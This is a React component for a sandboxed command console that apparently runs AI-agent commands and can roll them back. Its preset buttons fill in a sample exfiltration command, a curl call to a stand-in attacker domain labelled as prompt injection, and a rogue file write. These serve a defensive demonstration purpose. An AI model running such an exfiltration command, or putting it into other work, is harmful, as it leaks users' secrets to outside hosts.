import React, { useState } from 'react';
import { Terminal as TerminalIcon, Play, RotateCcw, Sparkles } from 'lucide-react';
import type { ExecutionResult } from '../types';

interface TerminalConsoleProps {
  executions: ExecutionResult[];
  onRunCommand: (command: string) => Promise<ExecutionResult>;
  onRollback: (snapshotId: string) => Promise<void>;
}

export const TerminalConsole: React.FC<TerminalConsoleProps> = ({
  executions,
  onRunCommand,
  onRollback,
}) => {
  const [command, setCommand] = useState('');
  const [running, setRunning] = useState(false);
  const [revertingId, setRevertingId] = useState<string | null>(null);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!command.trim() || running) return;

    try {
      setRunning(true);
      await onRunCommand(command.trim());
      setCommand('');
    } catch (e: any) {
      alert(`Execution failed: ${e.message || e}`);
    } finally {
      setRunning(false);
    }
  };

  const handleSimulate = (preset: string) => {
    setCommand(preset);
  };

  const handleRollback = async (snapId: string) => {
    try {
      setRevertingId(snapId);
      await onRollback(snapId);
    } catch (e: any) {
      alert(`Rollback failed: ${e.message || e}`);
    } finally {
      setRevertingId(null);
    }
  };

  return (
    <div className="bg-slate-900/60 border border-slate-800 rounded-xl p-5 flex flex-col h-full">
      <div className="flex items-center justify-between mb-4 pb-3 border-b border-slate-800">
        <div className="flex items-center gap-2">
          <TerminalIcon className="w-4 h-4 text-sky-400" />
          <h2 className="text-sm font-semibold text-white tracking-wide">
            Live Execution Console
          </h2>
        </div>

        {/* Quick Simulation Presets */}
        <div className="flex items-center gap-2">
          <span className="text-[11px] text-slate-500">Simulate:</span>
          <button
            onClick={() => handleSimulate('curl -s http://attacker-malicious-domain.com/leak')}
            className="px-2 py-1 text-[11px] font-mono bg-red-500/10 hover:bg-red-500/20 text-red-400 border border-red-500/30 rounded transition"
            title="Simulate prompt injection exfiltrating secrets"
          >
            Prompt Injection (curl)
          </button>
          <button
            onClick={() => handleSimulate('echo "malicious mutation" > rogue_file.txt')}
            className="px-2 py-1 text-[11px] font-mono bg-amber-500/10 hover:bg-amber-500/20 text-amber-400 border border-amber-500/30 rounded transition"
            title="Simulate destructive file write"
          >
            Destructive Mutation
          </button>
        </div>
      </div>

      {/* Terminal Input */}
      <form onSubmit={handleSubmit} className="mb-4">
        <div className="flex items-center bg-slate-950 border border-slate-700 rounded-lg px-3 py-2 font-mono text-xs focus-within:border-sky-500 focus-within:ring-1 focus-within:ring-sky-500">
          <span className="text-sky-400 select-none mr-2 font-bold">$</span>
          <input
            type="text"
            value={command}
            onChange={(e) => setCommand(e.target.value)}
            placeholder="Type command to execute in sandbox (e.g., npm test, git status)..."
            className="flex-1 bg-transparent text-white placeholder-slate-600 focus:outline-none"
            disabled={running}
          />
          <button
            type="submit"
            disabled={running || !command.trim()}
            className="flex items-center gap-1.5 px-3 py-1 bg-sky-600 hover:bg-sky-500 disabled:opacity-50 text-white rounded font-sans text-xs font-medium transition"
          >
            <Play className={`w-3 h-3 ${running ? 'animate-spin' : ''}`} />
            {running ? 'Running...' : 'Execute'}
          </button>
        </div>
      </form>

      {/* Execution logs */}
      <div className="flex-1 overflow-y-auto space-y-3 font-mono text-xs pr-1">
        {executions.length === 0 ? (
          <div className="h-48 flex flex-col items-center justify-center text-center text-slate-500 border border-dashed border-slate-800 rounded-lg">
            <TerminalIcon className="w-8 h-8 mb-2 opacity-40 text-slate-400" />
            <p className="text-xs text-slate-400">Ready for commands</p>
            <p className="text-[11px] text-slate-500 mt-1 max-w-xs">
              Execute commands using the input above or connect autonomous agents (Claude Code, Cursor) via MCP.
            </p>
          </div>
        ) : (
          executions.map((res, index) => {
            const isSuccess = res.exit_code === 0;
            return (
              <div
                key={index}
                className="p-3.5 rounded-lg bg-slate-950 border border-slate-800/80 space-y-2"
              >
                <div className="flex items-center justify-between text-[11px]">
                  <div className="flex items-center gap-2">
                    <span className="text-slate-400">$ {res.command}</span>
                    <span
                      className={`px-1.5 py-0.2 rounded text-[10px] font-semibold ${
                        isSuccess
                          ? 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/30'
                          : 'bg-red-500/20 text-red-400 border border-red-500/30'
                      }`}
                    >
                      Exit: {res.exit_code}
                    </span>
                    <span className="text-slate-500">{res.duration_ms}ms</span>
                  </div>

                  {res.snapshot_id && (
                    <div className="flex items-center gap-2 font-sans">
                      <span className="text-slate-500 text-[10px]">
                        Snapshot: <code className="text-sky-400">{res.snapshot_id}</code>
                      </span>
                      <button
                        onClick={() => handleRollback(res.snapshot_id!)}
                        disabled={revertingId === res.snapshot_id}
                        className="flex items-center gap-1 px-2 py-0.5 rounded text-[10px] font-medium bg-slate-800 hover:bg-slate-700 text-amber-300 border border-slate-700 transition"
                        title="Revert changes made by this command"
                      >
                        <RotateCcw className={`w-3 h-3 ${revertingId === res.snapshot_id ? 'animate-spin' : ''}`} />
                        Undo Command
                      </button>
                    </div>
                  )}
                </div>

                {/* Stdout / Stderr */}
                {res.stdout && (
                  <pre className="text-slate-300 whitespace-pre-wrap bg-slate-900/50 p-2.5 rounded border border-slate-800/50 text-[11px] max-h-40 overflow-y-auto">
                    {res.stdout}
                  </pre>
                )}
                {res.stderr && (
                  <pre className="text-red-400 whitespace-pre-wrap bg-red-950/20 p-2.5 rounded border border-red-900/30 text-[11px] max-h-40 overflow-y-auto">
                    {res.stderr}
                  </pre>
                )}

                {/* Diff Summary */}
                {res.diff_summary && (
                  <div className="text-[11px] text-slate-400 font-sans flex items-center gap-1.5 pt-1 border-t border-slate-800/60">
                    <Sparkles className="w-3.5 h-3.5 text-sky-400" />
                    <span>FS Mutation: <strong className="text-slate-300">{res.diff_summary}</strong></span>
                  </div>
                )}
              </div>
            );
          })
        )}
      </div>
    </div>
  );
};
